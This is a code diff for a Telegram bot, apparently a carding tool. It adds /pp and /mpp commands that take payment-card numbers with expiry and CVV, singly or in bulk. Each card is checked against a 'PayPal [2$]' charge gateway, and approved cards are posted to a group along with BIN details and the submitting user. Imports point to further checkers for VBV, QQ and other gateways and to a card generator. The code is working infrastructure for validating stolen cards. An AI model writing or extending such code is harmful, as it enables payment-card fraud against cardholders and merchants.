@@ -19,6 +19,7 @@ from vbv import check_vbv_card
 from py import check_paypal_card
 from qq import check_qq_card
 from cc import process_cc_card
+from pp import process_card_pp
 #====================================================================#
 
 #==============================API===================================#
@@ -1934,6 +1935,174 @@ def handle_sh(message):
 
     except Exception as e:
         bot.reply_to(message, f"❌ Error: {str(e)}")
+
+
+# Handle /pp command
+@bot.message_handler(commands=['pp'])
+@bot.message_handler(func=lambda m: m.text and m.text.startswith('.pp'))
+def handle_pp(message):
+    user_id = message.from_user.id
+    init_user(user_id, message.from_user.username)
+    if not use_credits(user_id):
+        bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
+        return
+
+    command_parts = message.text.split()
+    if len(command_parts) < 2:
+        bot.reply_to(message, "Please provide CC details in format: CC|MM|YY|CVV")
+        return
+
+    cc = command_parts[1]
+    if '|' not in cc:
+        bot.reply_to(message, "Invalid format. Use: CC|MM|YY|CVV")
+        return
+
+    user_status = get_user_status(message.from_user.id)
+    mention = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
+    bin_number = cc.split('|')[0][:6]
+    bin_info = get_bin_info(bin_number) or {}
+
+    checking_msg = checking_status_format(cc, "PayPal [2$]", bin_info)
+    status_message = bot.reply_to(message, checking_msg, parse_mode='HTML')
+
+    start_time = time.time()
+    check_result = process_card_pp(cc)
+    end_time = time.time()
+    time_taken = round(end_time - start_time, 2)
+
+    if check_result["status"].upper() == "APPROVED":
+        send_to_group(
+            cc=cc,
+            gateway=check_result["gateway"],
+            response=check_result["response"],
+            bin_info=bin_info,
+            time_taken=time_taken,
+            user_info=message.from_user
+        )
+
+    response_text = single_check_format(
+        cc=cc,
+        gateway=check_result["gateway"],
+        response=check_result["response"],
+        mention=mention,
+        Userstatus=user_status,
+        bin_info=bin_info,
+        time_taken=time_taken,
+        status=check_result["status"]
+    )
+
+    bot.edit_message_text(
+        chat_id=message.chat.id,
+        message_id=status_message.message_id,
+        text=response_text,
+        parse_mode='HTML'
+    )
+
+# Handle /mpp command
+@bot.message_handler(commands=['mpp'])
+@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mpp'))
+def handle_mpp(message):
+    user_id = message.from_user.id
+    init_user(user_id, message.from_user.username)
+
+    try:
+        cards_text = None
+        command_parts = message.text.split()
+
+        if len(command_parts) > 1:
+            cards_text = ' '.join(command_parts[1:])
+        elif message.reply_to_message:
+            cards_text = message.reply_to_message.text
+        else:
+            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
+            return
+
+        cards = []
+        for line in cards_text.split('\n'):
+            line = line.strip()
+            if line:
+                for card in line.split():
+                    if '|' in card:
+                        cards.append(card.strip())
+
+        if not cards:
+            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YY|CVV).")
+            return
+
+        if len(cards) > MAX_MASS_CHECK:
+            cards = cards[:MAX_MASS_CHECK]
+            bot.reply_to(message, f"⚠️ Maximum {MAX_MASS_CHECK} cards allowed. Checking first {MAX_MASS_CHECK} cards only.")
+
+        if not use_credits(user_id, len(cards)):
+            bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
+            return
+
+        initial_msg = f"🚀 Starting mass PayPal check of {len(cards)} cards..."
+        status_message = bot.reply_to(message, initial_msg)
+
+        gateway = "PayPal [2$]"
+
+        initial_processing_msg = format_mass_check_processing(len(cards), 0, gateway)
+        bot.edit_message_text(
+            chat_id=message.chat.id,
+            message_id=status_message.message_id,
+            text=initial_processing_msg,
+            parse_mode='HTML'
+        )
+
+        start_time = time.time()
+
+        def process_cards():
+            try:
+                results = []
+                for i, card in enumerate(cards, 1):
+                    try:
+                        result = process_card_pp(card)
+                        results.append({
+                            'card': card,
+                            'status': result['status'],
+                            'response': result['response'],
+                            'gateway': result.get('gateway', 'PayPal [2$]')
+                        })
+                    except Exception as e:
+                        results.append({
+                            'card': card,
+                            'status': 'ERROR',
+                            'response': f'Error: {str(e)}',
+                            'gateway': gateway
+                        })
+
+                    current_time = time.time() - start_time
+                    progress_msg = format_mass_check(results, len(cards), current_time, gateway, i)
+                    bot.edit_message_text(
+                        chat_id=message.chat.id,
+                        message_id=status_message.message_id,
+                        text=progress_msg,
+                        parse_mode='HTML'
+                    )
+
+                final_time = time.time() - start_time
+                final_msg = format_mass_check(results, len(cards), final_time, gateway, len(cards))
+                bot.edit_message_text(
+                    chat_id=message.chat.id,
+                    message_id=status_message.message_id,
+                    text=final_msg,
+                    parse_mode='HTML'
+                )
+            except Exception as e:
+                error_msg = f"Mass PayPal check failed: {str(e)}"
+                bot.edit_message_text(
+                    chat_id=message.chat.id,
+                    message_id=status_message.message_id,
+                    text=error_msg,
+                    parse_mode='HTML'
+                )
+
+        thread = threading.Thread(target=process_cards)
+        thread.start()
+
+    except Exception as e:
+        bot.reply_to(message, f"❌ An error occurred: {str(e)}")
 
 # Handle both /gen and .gen
 @bot.message_handler(commands=['gen'])
